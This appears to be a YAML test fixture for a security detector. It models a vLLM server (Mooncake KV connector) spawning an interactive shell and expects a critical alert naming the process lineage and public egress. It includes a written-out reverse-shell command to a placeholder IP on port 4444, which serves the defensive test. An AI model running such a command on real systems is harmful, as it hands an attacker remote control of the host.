subjects:
  bash:
    session: pid/1100:1
    program: /bin/bash
    actors: [{id: u1, name: Ops, email: ops@example.com}]
    device: gpu-1
    source: probe
  vllm:
    session: pid/1101:1
    parent: bash
    program: /opt/venv/bin/python3
    actors: [{id: u1, name: Ops}]
    device: gpu-1
    source: probe
  shell:
    session: pid/1102:1
    parent: vllm
    program: /bin/bash
    actors: [{id: u1, name: Ops}]
    device: gpu-1
    source: probe
observations:
  - {kind: session_start, subject: bash}
  - {kind: spawn, subject: vllm, cmdline: "python3 -m vllm.entrypoints.openai.api_server --model meta-llama/Llama-3-8B --kv-transfer-config kv_connector=MooncakeConnector"}
  - {kind: spawn, subject: shell, cmdline: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}
  - {kind: connect, subject: shell, host: 203.0.113.9, port: 4444, protocol: tcp}
trigger: 2
expect:
  action: report
  reason_contains: "[CRITICAL] vLLM+Mooncake KV transport server lineage"
  output_contains: ["stages=interactive shell requested by a serving process; public egress 203.0.113.9"]
  chain_min: 3
